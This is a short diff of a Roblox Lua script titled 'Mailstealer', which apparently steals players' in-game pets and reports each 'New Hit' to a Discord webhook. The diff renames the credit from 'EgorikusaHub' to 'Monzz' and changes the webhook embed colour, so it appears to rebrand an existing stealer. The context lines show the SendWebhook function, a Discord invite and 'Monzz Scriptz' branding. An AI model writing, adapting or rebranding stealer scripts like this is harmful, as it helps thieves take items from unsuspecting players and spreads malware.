@@ -1,4 +1,4 @@
--- [EgorikusaHub Mailstealer]
+-- [Monzz Mailstealer]
 
 local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
@@ -1032,7 +1032,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                 ["title"] = "**New Hit** ||Monzz Scriptz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
-                ["color"] = tonumber(0x2798FF),
+                ["color"] = tonumber(0xAB0909),
                 ["thumbnail"] = {
                     ["url"] = Image,
                     ["height"] = 420,
@@ -1102,7 +1102,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                 ["title"] = "**New Hit** ||Monzz Scriptz||",
                 ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
-                ["color"] = tonumber(0x2798FF),
+                ["color"] = tonumber(0xAB0909),
                 ["thumbnail"] = {
                     ["url"] = Image,
                     ["height"] = 420,
